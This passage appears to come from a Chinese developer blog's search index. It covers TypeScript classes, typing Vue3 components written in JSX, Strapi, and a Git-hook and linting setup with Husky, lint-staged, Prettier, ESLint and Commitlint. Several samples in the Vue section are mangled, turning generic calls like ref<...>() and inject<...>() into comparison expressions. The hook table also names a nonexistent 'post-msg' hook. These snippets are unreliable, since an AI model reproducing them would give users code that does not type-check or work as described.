reverse，前几次都是函数定义，最后一次是函数实现。在编辑器的代码提示中，可以正确的看到前两个提示。注意，TypeScript 会优先从最前面的函数定义开始匹配，所以多个函数定义如果有包含关系，需要优先把精确的定义写在前面。 类类型下面看一个使用类的例子： 1234567891011class Greeter &#123; greeting: string; constructor(message: string) &#123; this.greeting = message; &#125; greet() &#123; return &quot;Hello, &quot; + this.greeting; &#125;&#125;let greeter = new Greeter(&quot;world&quot;); 继承： 1234567891011121314151617181920212223242526272829303132333435class Animal &#123; name: string; constructor(theName: string) &#123; this.name = theName; &#125; move(distanceInMeters: number = 0) &#123; console.log(`$&#123;this.name&#125; moved $&#123;distanceInMeters&#125;m.`); &#125;&#125;class Snake extends Animal &#123; constructor(name: string) &#123; super(name); &#125; move(distanceInMeters = 5) &#123; console.log(&quot;Slithering...&quot;); super.move(distanceInMeters); &#125;&#125;class Horse extends Animal &#123; constructor(name: string) &#123; super(name); &#125; move(distanceInMeters = 45) &#123; console.log(&quot;Galloping...&quot;); super.move(distanceInMeters); &#125;&#125;let sam = new Snake(&quot;Sammy the Python&quot;);let tom: Animal = new Horse(&quot;Tommy the Palomino&quot;);sam.move();tom.move(34); 公共，私有与受保护的修饰符： public：默认的修饰符，允许在类的外部和派生类访问 private：不允许在声明它的类的外部访问 protected：允许在派生类中访问 1234567891011121314151617181920212223class Person &#123; protected name: string; constructor(name: string) &#123; this.name = name; &#125;&#125;class Employee extends Person &#123; private department: string; constructor(name: string, department: string) &#123; super(name); this.department = department; &#125; public getElevatorPitch() &#123; return `Hello, my name is $&#123;this.name&#125; and I work in $&#123;this.department&#125;.`; &#125;&#125;let howard = new Employee(&quot;Howard&quot;, &quot;Sales&quot;);console.log(howard.getElevatorPitch());console.log(howard.name); // 错误 **属性只读：**你可以使用 readonly 关键字将属性设置为只读的。 只读属性必须在声明时或构造函数里被初始化。 123456789class Octopus &#123; readonly name: string; readonly numberOfLegs: number = 8; constructor(theName: string) &#123; this.name = theName; &#125;&#125;let dad = new Octopus(&quot;Man with the 8 strong legs&quot;);dad.name = &quot;Man with the 3-piece suit&quot;; // 错误! name 是只读的. 静态属性： 123456789101112131415class Grid &#123; static origin = &#123; x: 0, y: 0 &#125;; calculateDistanceFromOrigin(point: &#123; x: number; y: number &#125;) &#123; let xDist = point.x - Grid.origin.x; let yDist = point.y - Grid.origin.y; return Math.sqrt(xDist * xDist + yDist * yDist) / this.scale; &#125; constructor(public scale: number) &#123;&#125;&#125;let grid1 = new Grid(1.0); // 1x scalelet grid2 = new Grid(5.0); // 5x scaleconsole.log(grid1.calculateDistanceFromOrigin(&#123; x: 10, y: 10 &#125;));console.log(grid2.calculateDistanceFromOrigin(&#123; x: 10, y: 10 &#125;)); 抽象类：抽象类的特性如下： 抽象类做为其它派生类的基类使用。 它们一般不会直接被实例化 抽象类可以包含成员的实现细节 abstract 关键字是用于定义抽象类和在抽象类内部定义抽象方法 抽象类中的抽象方法不包含具体实现并且必须在派生类中实现 123456789101112131415161718192021222324252627282930abstract class Department &#123; constructor(public name: string) &#123;&#125; printName(): void &#123; console.log(&quot;Department name: &quot; + this.name); &#125; abstract printMeeting(): void; // 必须在派生类中实现&#125;class AccountingDepartment extends Department &#123; constructor() &#123; super(&quot;Accounting and Auditing&quot;); // 在派生类的构造函数中必须调用 super() &#125; printMeeting(): void &#123; console.log(&quot;The Accounting Department meets each Monday at 10am.&quot;); &#125; generateReports(): void &#123; console.log(&quot;Generating accounting reports...&quot;); &#125;&#125;let department: Department; // 允许创建一个对抽象类型的引用department = new Department(); // 错误: 不能创建一个抽象类的实例department = new AccountingDepartment(); // 允许对一个抽象子类进行实例化和赋值department.printName();department.printMeeting();department.generateReports(); // 错误: 方法在声明的抽象类中不存在 **"},{"title":"Vue3 + JSX + Typescript 使用手册","path":"/2023/07/31/096fe8cfde27/","content":"背景知识对标题提到的知识不熟悉的，这里推荐几个学习的地方： Vue3 - https://cn.vuejs.org/guide/introduction.html JSX - https://cn.vuejs.org/guide/extras/render-function.html Typescript - https://ts.xcatliu.com/introduction/what-is-typescript.html 工程搭建脚手架先来说下如何搭建个 Vue3 + Ts 的脚手架，这也分两种情况，下面分开说： 从零开始 从零开始的话可以使用 create-vue，即官方的项目脚手架工具，提供了基于 vite + Ts 的脚手架模板。 更多的使用细节，见官方文档 https://cn.vuejs.org/guide/typescript/overview.html#project-setup Vue 之前还提供过一个 Vue CLI 工具基于 webpack 平台，也可以用来生成 Vue3 的脚手架，但是现在已处于维护状态，官方也建议基于 vite 平台开发，因此这里就不过多介绍了。 脚手架升级 第二种就是在现有的脚手架上添加上 Typescript ，这种情况就不好说了，原先的脚手架可能是 Vue CLI 生成的，create-vue 生成的，或者直接用 webpack，rollup 等工具手撸出来的，可能性太多，我也没办法枚举出来。 这里我列下我在网上找到了，如何在现有的项目中添加 TS 的文档，可以参考下： Vue CLI：https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-typescript Vite：https://cn.vitejs.dev/guide/features.html#typescript Webpack：https://webpack.docschina.org/guides/typescript/ Rollup：https:&#x2F;&#x2F;www.npmjs.com&#x2F;package&#x2F;@rollup&#x2F;plugin-typescript 现在的前端工程都是多个工具集成在一起的超复杂配置，而上面的文档都是单点工具的集成，不一定有用，因此这里建议集成 TS 时可以从 github 上找下有没有类似的项目，参考现有工程可以轻松一点。 配置 JSX如何在 Vue 中使用 JSX 需要单独说明一下，因为它一般在脚手架里不是默认配置的，Vue 官方推荐的写法是单文件组件，但是其在灵活性上还是差点意思，因此我还是更喜欢用 JSX 去写模板。 Vue 官方也是有考虑到我们这部分人的需求，因此推出了一系列插件，来支持 JSX 模板的渲染。 Vite 123456789101112## 安装依赖pnpm add @vitejs/plugin-vue-jsx -D## 在 vite.config.ts 中添加插件import &#123; defineConfig &#125; from &quot;vite&quot;;import vueJsx from &quot;@vitejs/plugin-vue-jsx&quot;;export default defineConfig(&#123; plugins: [ vueJsx(), ]&#125;) Vue CLI 12345678910111213141516## 检查下 babel.config.js 中配置是有 @vue/cli-plugin-babel/preset，有的话无需额外配置## preset 中已经包含了 jsx 的插件配置module.exports = &#123; presets: [&quot;@vue/cli-plugin-babel/preset&quot;], plugins: [],&#125;;## 否则的话就需要单独配置了## 安装插件pnpm add @vue/babel-plugin-jsx -D## 在 babel.config.js 中添加插件module.exports = &#123; plugins: [&#x27;@vue/babel-plugin-jsx&#x27;],&#125;; 类型定义下面来到文章的重点了，本章节会介绍下如何对 Vue 的一些语法进行类型标注，下面看下一个 Vue3 + JSX + Typescript 的组件长什么样？ 12345678910111213141516171819202122232425262728293031323334import type &#123; SlotsType &#125; from &quot;vue&quot;;import &#123; defineComponent &#125; from &quot;vue&quot;;export const IconButton = defineComponent(&#123; name: &quot;IconButton&quot;, props: &#123; actived: &#123; type: Boolean, default: false, &#125;, tight: &#123; type: Boolean, default: false, &#125;, &#125;, emits: &#123; click: () =&gt; true &#125;, slots: Object as SlotsType&lt;&#123; default: any &#125;&gt;, setup(props, &#123; emit, slots &#125;) &#123; return () =&gt; ( &lt;div onClick=&#123;() =&gt; emit(&quot;click&quot;)&#125; class=&#123;[ &quot;rounded cursor-pointer hover:bg-[rgba(0,0,0,.04)] inline-flex&quot;, props.tight ? &quot;p-1&quot; : &quot;p-[6px]&quot;, &#123; &quot;bg-[rgba(0,0,0,.04)]&quot;: props.actived &#125;, ]&#125; &gt; &#123;slots.default?.()&#125; &lt;/div&gt; ); &#125;,&#125;); 众所周知 Vue3 的语法分成两种：组合式和选项式，这里采用的就是选项示的写法，但是因为采用了 JSX，所有的代码都需要包裹在 defineComponent，导致代码看起来既像组合式又像选项示，起初看文档时也给我整懵了，实际上他还是选项示，只是 props，emits 等定义和组合式雷同而已。 为组件的 props 标注类型12345678910import &#123; defineComponent &#125; from &quot;vue&quot;;export default defineComponent(&#123; props: &#123; message: String, &#125;, setup(props) &#123; props.message; // &lt;-- 类型：string &#125;,&#125;); 复杂的 prop 类型对于复杂类型，我们可以使用 PropType 工具类型： 12345678import &#123; defineComponent &#125; from &#x27;vue&#x27;import type &#123; PropType &#125; from &#x27;vue&#x27;export default defineComponent(&#123; props: &#123; book: Object as PropType&lt;Book&gt; &#125;&#125;) 不借助工具函数也可以： 12345678import &#123; defineComponent &#125; from &#x27;vue&#x27;import type &#123; PropType &#125; from &#x27;vue&#x27;export default defineComponent(&#123; props: &#123; book: Object as () =&gt; Book &#125;&#125;) 为组件的 emits 标注类型12345678import &#123; defineComponent &#125; from &quot;vue&quot;;export default defineComponent(&#123; emits: [&quot;change&quot;], setup(props, &#123; emit &#125;) &#123; emit(&quot;change&quot;); // &lt;-- 类型检查 / 自动补全 &#125;,&#125;); 如果 emit 函数有入参，我们可以将 emits 改成对象的形式： 12345678910import &#123; defineComponent &#125; from &#x27;vue&#x27;export default defineComponent(&#123; emits: &#123; change：(value: string) =&gt; true, // 函数内部可以执行运行时检查 &#125;, setup(props, &#123; emit &#125;) &#123; emit(&#x27;change&#x27;, &quot;text&quot;) // &lt;-- 类型检查 / 自动补全 &#125;&#125;) 为组件的 slots 标注类型我们可以使用 SlotsType 工具类型： 1234567891011import &#123; defineComponent &#125; from &#x27;vue&#x27;export default defineComponent(&#123; slots: Object as SlotsType&lt;&#123; footer: any &#125;&gt;, setup(props, &#123; slots &#125;) &#123; return () =&gt; ( &lt;div&gt; &#123;slots.footer?.()&#125; &lt;/div&gt; )&#125;) 为 ref() 标注类型ref 会根据初始化时的值推导其类型： 1234567import &#123; ref &#125; from &quot;vue&quot;;// 推导出的类型：Ref&lt;number&gt;const year = ref(2020);// =&gt; TS Error: Type &#x27;string&#x27; is not assignable to type &#x27;number&#x27;.year.value = &quot;2020&quot;; 有时我们可能想为 ref 内的值指定一个更复杂的类型，可以通过使用 Ref 这个类型： 123456import &#123; ref &#125; from &quot;vue&quot;;import type &#123; Ref &#125; from &quot;vue&quot;;const year: Ref&lt;string | number&gt; = ref(&quot;2020&quot;);year.value = 2020; // 成功！ 或者，在调用 ref() 时传入一个泛型参数，来覆盖默认的推导行为： 1234// 得到的类型：Ref&lt;string | number&gt;const year = (ref &lt; string) | (number &gt; &quot;2020&quot;);year.value = 2020; // 成功！ 如果你指定了一个泛型参数但没有给出初始值，那么最后得到的就将是一个包含 undefined 的联合类型： 12// 推导得到的类型：Ref&lt;number | undefined&gt;const n = ref&lt;number&gt;() 为 reactive() 标注类型reactive() 也会隐式地从它的参数中推导类型： 1234import &#123; reactive &#125; from &quot;vue&quot;;// 推导得到的类型：&#123; title: string &#125;const book = reactive(&#123; title: &quot;Vue 3 指引&quot; &#125;); 要显式地标注一个 reactive 变量的类型，我们可以使用接口： 12345678import &#123; reactive &#125; from &#x27;vue&#x27;interface Book &#123; title: string year?: number&#125;const book: Book = reactive(&#123; title: &#x27;Vue 3 指引&#x27; &#125;) 不推荐使用 reactive() 的泛型参数，因为处理了深层次 ref 解包的返回值与泛型参数的类型不同。 为 computed() 标注类型computed() 会自动从其计算函数的返回值上推导出类型： 123456789import &#123; ref, computed &#125; from &quot;vue&quot;;const count = ref(0);// 推导得到的类型：ComputedRef&lt;number&gt;const double = computed(() =&gt; count.value * 2);// =&gt; TS Error: Property &#x27;split&#x27; does not exist on type &#x27;number&#x27;const result = double.value.split(&quot;&quot;); 你还可以通过泛型参数显式指定类型： 123456const double = computed &lt; number &gt; (() =&gt; &#123; // 若返回值不是 number 类型则会报错 &#125;); 为 provide &#x2F; inject 标注类型provide 和 inject 通常会在不同的组件中运行。要正确地为注入的值标记类型，Vue 提供了一个 InjectionKey 接口，它是一个继承自 Symbol 的泛型类型，可以用来在提供者和消费者之间同步注入值的类型： 12345678import &#123; provide, inject &#125; from &#x27;vue&#x27;import type &#123; InjectionKey &#125; from &#x27;vue&#x27;const key = Symbol() as InjectionKey&lt;string&gt;provide(key, &#x27;foo&#x27;) // 若提供的是非字符串值会导致错误const foo = inject(key) // foo 的类型：string | undefined 建议将注入 key 的类型放在一个单独的文件中，这样它就可以被多个组件导入。当使用字符串注入 key 时，注入值的类型是 unknown，需要通过泛型参数显式声明： 1const foo = inject &lt; string &gt; &quot;foo&quot;; // 类型：string | undefined 注意注入的值仍然可以是 undefined，因为无法保证提供者一定会在运行时 provide 这个值。当提供了一个默认值后，这个 undefined 类型就可以被移除： 1const foo = inject &lt; string &gt; (&quot;foo&quot;, &quot;bar&quot;); // 类型：string 如果你确定该值将始终被提供，则还可以强制转换该值： 1const foo = inject(&#x27;foo&#x27;) as string 为模板引用标注类型模板引用需要通过一个显式指定的泛型参数和一个初始值 null 来创建： 12345678910111213&lt;script setup lang=&quot;ts&quot;&gt;import &#123; ref, onMounted &#125; from &#x27;vue&#x27;const el = ref&lt;HTMLInputElement | null&gt;(null)onMounted(() =&gt; &#123; el.value?.focus()&#125;)&lt;/script&gt;&lt;template&gt; &lt;input ref=&quot;el&quot; /&gt;&lt;/template&gt; 可以通过类似于 MDN 的页面来获取正确的 DOM 接口。注意为了严格的类型安全，有必要在访问 el.value 时使用可选链或类型守卫。这是因为直到组件被挂载前，这个 ref 的值都是初始的 null，并且在由于 v-if 的行为将引用的元素卸载时也可以被设置为 null。 为组件模板引用标注类型有时，你可能需要为一个子组件添加一个模板引用，以便调用它公开的方法。举例来说，我们有一个 MyModal 子组件，它有一个打开模态框的方法： 1234567891011&lt;!-- MyModal.vue --&gt;&lt;script setup lang=&quot;ts&quot;&gt;import &#123; ref &#125; from &#x27;vue&#x27;const isContentShown = ref(false)const open = () =&gt; (isContentShown.value = true)defineExpose(&#123; open&#125;)&lt;/script&gt; 为了获取 MyModal 的类型，我们首先需要通过 typeof 得到其类型，再使用 TypeScript 内置的 InstanceType 工具类型来获取其实例类型： 12345678910&lt;!-- App.vue --&gt;&lt;script setup lang=&quot;ts&quot;&gt;import MyModal from &#x27;./MyModal.vue&#x27;const modal = ref&lt;InstanceType&lt;typeof MyModal&gt; | null&gt;(null)const openModal = () =&gt; &#123; modal.value?.open()&#125;&lt;/script&gt; 注意，如果你想在 TypeScript 文件而不是在 Vue SFC 中使用这种技巧，需要开启 Volar 的 Takeover 模式。如果组件的具体类型无法获得，或者你并不关心组件的具体类型，那么可以使用 ComponentPublicInstance。这只会包含所有组件都共享的属性，比如 $el。 1234import &#123; ref &#125; from &quot;vue&quot;;import type &#123; ComponentPublicInstance &#125; from &quot;vue&quot;;const child = (ref &lt; ComponentPublicInstance) | (null &gt; null); 总结由于 Vue 的语法糖太多，导致 Vue 的官方文档就像是一个大杂烩，大而全，也导致了我在看官方文档时被各种写法，各种 API 搞的迷迷糊糊。因此我在官方文档的基础上加上自己的一些理解，整理出了这篇手册，希望能帮助到你。（小声逼逼下：这套技术栈写起来好像 react 啊，要不你两合并算了）"},{"title":"Strapi：一款基于Node.js 开发的无头内容管理系统","path":"/2023/07/25/0415a8b11d8e/","content":"strapi 是什么？strapi 这个名字取自 bootstrap 的后缀 strap，然后因为它是一个提供快速生成安全可靠的 api 架构，然后再加了一个 i，合并就是 strapi，bootstrap 的有启动的意思，你可以用 strapi 来快速构建你的后端，可以快速让自己的项目启动。几个关键词 快速 ：是因为一个命令就生成了后端用户、权限、文件上传等基本的后端轮子 简单：strapi 启动后，有一个后端管理页面，你可以在后端新增表，新增完成后，后端自动重启，然后生成与之对应的增删改查的基本 api 安全：strapi 充分考虑了 api 的安全性，对每个接口都有保护限制，你可以在后端管理页面去做定制化的配置 插件化：内置了基本够用的插件，如内容管理器、API 文档、媒体库、角色&amp;权限，你也可以按照官方设定，制作自己的插件 自定义 API：除了官方自动生成的 api，你也可以自己编写定制的 api，内置了丰富的变量，并支持 graphql 本地部署：strapi 是完全开源的，其实就是一个后端轮子，down 下来后，改改业务就可以发布了，完全由你掌控，而不是一个云端产品。 你可以把 strapi 当做自己开发项目的快速启动的工具，就算没有后端基础，只要会 js，你就可以写出专业级的后端，是前端开发者的福利，更是独立开发者的一把尖刀利器！"},{"title":"前端编程规范工具链","path":"/2023/07/17/a9d235b55733/","content":"当多个开发人员合作开发一个前端项目时，代码质量和一致性是非常重要的。在大型项目中，代码质量和一致性的缺失可能会导致团队之间的沟通问题和代码维护的困难。为了确保代码质量和一致性，前端编程规范工具链是必不可少的。它可以帮助团队在整个开发周期内保持代码风格的一致性，减少错误和冲突，并提高代码质量和效率。在这篇文章中，我们将介绍一些常用的前端编程规范工具，以及它们如何帮助团队提高代码质量和效率。 Husky https://github.com/typicode/husky Husky 是一个 Git 钩子工具，可以在 Git 操作（例如提交或推送）之前运行脚本。它可以帮助团队确保代码符合前端编程规范，并在提交或推送之前运行 ESLint、Prettier 和 Stylelint 等工具。 Git HookGit hook 都被存储在 Git 目录下的 hooks 子目录中。 也即绝大部分项目中的 .git&#x2F;hooks 。 这些以 .sample 结尾的文件都是在 git init 初始化时，git 默认安装的示例文件，这些文件都是 shell 脚本，移除后缀就可以启动了。 这些钩子的执行时机和作用如下： 分类 钩子 描述 提交工作流钩子 pre-commit git commit 前运行，可以检查代码风格是否一致、单元测试等 prepare-commit-msg 钩子在启动提交信息编辑器之前，默认信息被创建之后运行。 它允许你编辑提交者所看到的默认信息。 commit-msg 接收一个参数，git commit 信息的文件路径（默认为.git&#x2F;COMMIT_EDITMSG） post-msg git commit 之后运行，一般用于通知之类的事情，如：git log -1 HEAD 电子邮件工作流钩子 applypatch-msg 它接收单个参数：包含请求合并信息的临时文件的名字。 如果脚本返回非零值，Git 将放弃该补丁。 你可以用该脚本来确保提交信息符合格式，或直接用脚本修正格式错误。 pre-applypatch 它正好运行于应用补丁之后，产生提交之前，所以你可以用它在提交前检查快照。 你可以用这个脚本运行测试或检查工作区。 如果有什么遗漏，或测试未能通过，脚本会以非零值退出，中断 git am 的运行，这样补丁就不会被提交 post-applypatch 运行于提交产生之后，是在 git am 运行期间最后被调用的钩子。 你可以用它把结果通知给一个小组或所拉取的补丁的作者。 但你没办法用它停止打补丁的过程 其它客户端钩子 pre-rebase git rebase 之前 post-rewrite 被那些会替换提交记录的命令调用，比如 git commit –amend 和 git rebase（不过不包括 git filter-branch） post-checkout git checkout 成功运行后 post-merge 在 git merge 成功运行后 pre-push 会在 git push 运行期间， 更新了远程引用但尚未传送对象时被调用 服务器端钩子 pre-receive 处理来自客户端的推送操作时，最先被调用的脚本是 pre-receive。 update update 脚本和 pre-receive 脚本十分类似，不同之处在于它会为每一个准备更新的分支各运行一次。 post-receive post-receive 挂钩在整个过程完结以后运行，可以用来更新其他系统服务或者通知用户。 这里只是简单的介绍了下各个钩子的作用，要想更深入的了解这些钩子，请看官方文档：自定义 Git - Git 钩子 既然把一个正确命名（不带扩展名）且可执行的文件放入 .git 目录下的 hooks 子目录中，即可激活该钩子脚本。为什么还要使用 husky ，这是因为 .git 目录下的文件变动 git 本身是无法监听到的，无法统一管理 hook 脚本。 Husky 低版本安装1234567891011121314#1、安装huskynpm install husky --save-dev#2、在package.json中添加使用钩子&#123; &quot;husky&quot;: &#123; &quot;hooks&quot;: &#123; &quot;pre-commit&quot;: &quot;npm run test&quot;, // 在commit之前先执行npm run test命令 &quot;commit-msg&quot;: &quot;commitlint -e $HUSKY_GIT_PARAMS&quot; // 校验commit时msg是否符合我们要求的规范 &#125; &#125;&#125; Husky 高版本安装（从 v6.0 之后）使用方法 1: 1234567891011121314#1、安装 huskynpm install husky --save-dev#2、Enable Git hooksnpx husky install#3、为了在项目 npm install 之后，运行第二步，在 package.json 中添加如下内容&#123; &quot;scripts&quot;: &#123; &quot;prepare&quot;: &quot;husky install&quot; &#125;&#125; 推荐使用方法： 12# 安装 husky，修改 package.json 配置，默认添加 pre-commit hooknpx husky-init &amp;&amp; npm install 添加其他 git hook 如下： 1npx husky add .husky/commit-msg &#x27;npx --no-install commitlint --edit &quot;$1&quot;&#x27; npx husky install 做了两件事： 在根目录新建.husky 目录，用于存放 git hook； 修改 .git&#x2F;config 配置文件，core.hooksPath &#x3D; .husky(指向 husky 新建的目录) huksy 在 6.0 时有个破坏性升级，hook 配置方式和之前皆然不同，为什么放弃之前的配置方式： Why husky has dropped conventional JS config Why husky doesn’t autoinstall anymore 中文可以参考这篇husky 使用总结 Lint-Staged https://github.com/okonet/lint-staged lint-staged 是一个 Git 钩子工具，可以在 Git 操作（例如提交或推送）之前运行脚本。它可以帮助团队仅对更改过的文件（暂存区中的文件）运行 ESLint、Prettier 和 Stylelint 等工具，从而提高效率并减少不必要的检查。 安装 lint-staged 123#npm install lint-staged --save-dev 在 husky 中添加 pre-commit 钩子，执行 lint-staged 命令 1234#!/bin/sh. &quot;$(dirname &quot;$0&quot;)/_/husky.sh&quot;pnpm exec lint-staged 在 package.json 中添加配置 12345&#123; &quot;lint-staged&quot;: &#123; &quot;*.&#123;vue,js,ts,jsx,tsx,md,json&#125;&quot;: &quot;eslint --fix&quot; &#125;&#125; Prettier https://github.com/prettier/prettier PrettierPrettier 是一个自动化代码格式化工具，可以根据预定义的规则自动格式化代码。它支持多种编程语言，并且可以与 ESLint 集成以确保代码风格的一致性。Prettier 可以与大多数编辑器和 IDE 集成，以便在编写代码时自动格式化代码。 Prettier 不仅仅是一个代码格式化工具，还是一整套风格指南，并且大部分规则不可改变。作者在在 Prettier 官方文档的 “Why Prettier?”章节中，详细回答了这么做的原因。虽然有一个通用的代码风格对项目和团队来说很有好处，但是编码是个特别情绪化的过程，就像一千个读者就有一千个哈姆雷特一样，每个人钟意的风格都不一样，开发已经很累了，没必要浪费时间讨论风格问题。Prettier 使用争议最小的编码风格，足以让大部分人满意了，考虑到 Prettier 的独特优势，这些“牺牲”还是值得的。 安装 prettier 1npm install --save-dev --save-exact prettier 配置 prettier 风格 prettier 支持多种格式的配置文件 Configuration File · Prettier 1echo &#123;&#125;&gt; .prettierrc.json 添加个空的配置文件是为了告诉 vscode，你的项目正在使用 prettier，配合 [Prettier - Code formatter](Prettier - Code formatter) 插件可以实现保存时自动格式化 添加忽略文件 123# Ignore artifacts:buildcoverage 格式化 1npx prettier . --write 直接使用 **npx prettier . --write** 会格式化整个项目的所有代码，这很没必要，配合 lint-staged，只格式化改动的代码。 12345&#123; &quot;lint-staged&quot;: &#123; &quot;*.&#123;vue,js,ts,jsx,tsx,md,json&#125;&quot;: &quot;prettier . --write&quot; &#125;&#125; ESLint https://github.com/eslint/eslint ESLint 是一个非常流行的 JavaScript 代码检查工具，可以帮助团队确保代码风格的一致性。它支持大多数 JavaScript 代码风格，并且可以通过插件进行扩展以满足团队的特定需求。ESLint 还可以与许多编辑器和集成开发环境（IDE）集成，以便在编写代码时自动检查代码。 配置 Eslint 安装 eslint 1npm install --save-dev eslint 添加任一支持的配置文件格式的 .eslintrc 文件。 12# 创建 JavaScript 配置文件touch .eslintrc.js 添加配置 123456789101112// .eslintrc.js 示例module.exports = &#123; &quot;env&quot;: &#123; &quot;browser&quot;: true, &quot;es2021&quot;: true &#125;, &quot;extends&quot;: &quot;eslint:recommended&quot;, &quot;parserOptions&quot;: &#123; &quot;ecmaVersion&quot;: &quot;latest&quot;, &quot;sourceType&quot;: &quot;module&quot; &#125;,&#125; 具体的 Eslint 规则配置这里不多介绍了，可以看下这篇文章 - 看完这篇文章，我不信你还对 eslint 一知半解 执行检查命令 1npx eslint project-dir/ file1.js 解决 Eslint 和 Prettier 冲突的问题当在项目中同时配置 Eslint 和 Prettier 时就会出现冲突的问题，这是因为 Eslint 可以同时进行代码风格及质量校验，因此在代码风格方面就和 Prettier 冲突了，这个时候我们希望代码格式由 Prettier 负责就好，而 Eslint 只需负责代码质量。 解决方案时借助 eslint-config-prettier 和 eslint-plugin-prettier。 eslint-config-prettier 作用是关闭 eslint 中与 prettier 冲突的规则。 eslint-plugin-prettier 作用是让 eslint 用 prettier 来格式化，相当于当代码格式不符合 prettier 的配置的时候，也可以报错一个 eslint 错误。 修改配置如下： 1234567module.exports = &#123; extends: [ // 新增如下的配置，实际上就是eslint-plugin-prettier的推荐规则集 // 而eslint-plugin-prettier实际上就是依赖eslint-config-prettier来关闭冲突的，使用前需同时安装这两个包 &quot;plugin:prettier/recommended&quot;, ],&#125;; 最后同样使用 lint-staged 只格式化改动的文件： 12345&#123; &quot;lint-staged&quot;: &#123; &quot;*.&#123;vue,js,ts,jsx,tsx,md,json&#125;&quot;: &quot;eslint --fix&quot; &#125;&#125; 如果在上一步你的 vscode 配置了保存后 prettier 自动格式化，那么就会出现 prettier 格式化后，eslint 报错的问题，其解决方案也很简单，使用 eslint 去格式化： 使用 prettier 格式化配置如下: “editor.formatOnSave”: true, &#x2F;&#x2F; 保存后自动格式化“editor.defaultFormatter”: “esbenp.prettier-vscode”, &#x2F;&#x2F; 默认使用 prettier 格式化“[javascript]”: { &#x2F;&#x2F; 手动配置各种文件的格式化工具“editor.defaultFormatter”: “esbenp.prettier-vscode”} 修改后，使用 eslint 格式化“editor.formatOnSave”: false, &#x2F;&#x2F; 禁止保存后自动格式化“editor.codeActionsOnSave”: {“source.fixAll.eslint”: true} Commitlint https://commitlint.js.org/#/ Commitlint 是一个 Git 提交消息检查工具，可以帮助团队确保 Git 提交消息的一致性和规范性。它可以检查提交消息的格式、结构和内容，并提供有用的错误提示和建议。Commitlint 可以与 Husky 集成，以便在提交代码时自动运行。 要将 commitlint 集成到项目中，需要安装以下工具： @commitlint&#x2F;cli：用于校验 Git 提交信息格式 @commitlint&#x2F;config-conventional：一套约定式的 commit message 书写规范（可选，可以自定义规范） @commitlint&#x2F;prompt-cli：交互式 commit message 书写工具 commitizen：同 @commitlint&#x2F;prompt-cli，二选一就行 @commitlint&#x2F;cz-commitlint：commitizen 的适配器 cz-git：同 @commitlint&#x2F;cz-commitlint，二选一就行 上面 commitlint 的工具链也是非常多的，不需要都安装，按需使用即可，这里我们选择 @commitlint&#x2F;cli + commitizen + cz-git 安装 1npm install @commitlint/cli commitizen cz-git -D 添加配置文件，这一步我们不使用 @commitlint&#x2F;config-conventional，而是自定义规范 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100const fg = require(&quot;fast-glob&quot;);const packages = fg.sync(&quot;*&quot;, &#123; cwd: &quot;packages&quot;, onlyDirectories: true &#125;);/** @type &#123;import(&#x27;cz-git&#x27;).UserConfig&#125; */module.exports = &#123; rules: &#123; // @see: https://commitlint.js.org/#/reference-rules &quot;scope-enum&quot;: [2, &quot;always&quot;, [...packages]], &quot;subject-min-length&quot;: [2, &quot;always&quot;, 2], &quot;subject-empty&quot;: [2, &quot;never&quot;], &#125;, prompt: &#123; alias: &#123; fd: &quot;docs: fix typos&quot; &#125;, messages: &#123; type: &quot;选择你要提交的类型 :&quot;, scope: &quot;选择一个提交范围（可选）:&quot;, customScope: &quot;请输入自定义的提交范围 :&quot;, subject: &quot;填写简短精炼的变更描述 : &quot;, body: &#x27;填写更加详细的变更描述（可选）。使用 &quot;|&quot; 换行 : &#x27;, breaking: &#x27;列举非兼容性重大的变更（可选）。使用 &quot;|&quot; 换行 : &#x27;, footerPrefixesSelect: &quot;选择关联issue前缀（可选）:&quot;, customFooterPrefix: &quot;输入自定义issue前缀 :&quot;, footer: &quot;列举关联issue (可选) 例如: #31, #I3244 : &quot;, confirmCommit: &quot;是否提交或修改commit ?&quot;, &#125;, types: [ &#123; value: &quot;feat&quot;, name: &quot;feat: 新增功能 | A new feature&quot; &#125;, &#123; value: &quot;fix&quot;, name: &quot;fix: 修复缺陷 | A bug fix&quot; &#125;, &#123; value: &quot;docs&quot;, name: &quot;docs: 文档更新 | Documentation only changes&quot;, &#125;, &#123; value: &quot;style&quot;, name: &quot;style: 代码格式 | Changes that do not affect the meaning of the code&quot;, &#125;, &#123; value: &quot;refactor&quot;, name: &quot;refactor: 代码重构 | A code change that neither fixes a bug nor adds a feature&quot;, &#125;, &#123; value: &quot;perf&quot;, name: &quot;perf: 性能提升 | A code change that improves performance&quot;, &#125;, &#123; value: &quot;test&quot;, name: &quot;test: 测试相关 | Adding missing tests or correcting existing tests&quot;, &#125;, &#123; value: &quot;build&quot;, name: &quot;build: 构建相关 | Changes that affect the build system or external dependencies&quot;, &#125;, &#123; value: &quot;ci&quot;, name: &quot;ci: 持续集成 | Changes to our CI configuration files and scripts&quot;, &#125;, &#123; value: &quot;revert&quot;, name: &quot;revert: 回退代码 | Revert to a commit&quot; &#125;, &#123; value: &quot;chore&quot;, name: &quot;chore: 其他修改 | Other changes that do not modify src or test files&quot;, &#125;, ], useEmoji: false, emojiAlign: &quot;center&quot;, useAI: false, aiNumber: 1, themeColorCode: &quot;&quot;, scopes: packages, allowCustomScopes: true, allowEmptyScopes: true, customScopesAlign: &quot;bottom&quot;, customScopesAlias: &quot;custom&quot;, emptyScopesAlias: &quot;empty&quot;, upperCaseSubject: false, markBreakingChangeMode: false, allowBreakingChanges: [&quot;feat&quot;, &quot;fix&quot;], breaklineNumber: 100, breaklineChar: &quot;|&quot;, skipQuestions: [], issuePrefixes: [ // 如果使用 gitee 作为开发管理 &#123; value: &quot;link&quot;, name: &quot;link: 链接 ISSUES 进行中&quot; &#125;, &#123; value: &quot;closed&quot;, name: &quot;closed: 标记 ISSUES 已完成&quot; &#125;, ], customIssuePrefixAlign: &quot;top&quot;, emptyIssuePrefixAlias: &quot;skip&quot;, customIssuePrefixAlias: &quot;custom&quot;, allowCustomIssuePrefix: true, allowEmptyIssuePrefix: true, confirmColorize: true, maxHeaderLength: Number.POSITIVE_INFINITY, maxSubjectLength: Number.POSITIVE_INFINITY, minSubjectLength: 0, scopeOverrides: undefined, defaultBody: &quot;&quot;, defaultIssues: &quot;&quot;, defaultScope: &quot;&quot;, defaultSubject: &quot;&quot;, &#125;,&#125;; 在 package.json 中添加如下配置 123456789&#123; &quot;scripts&quot;: &#123; &quot;cz&quot;: &quot;cz&quot; &#125;, 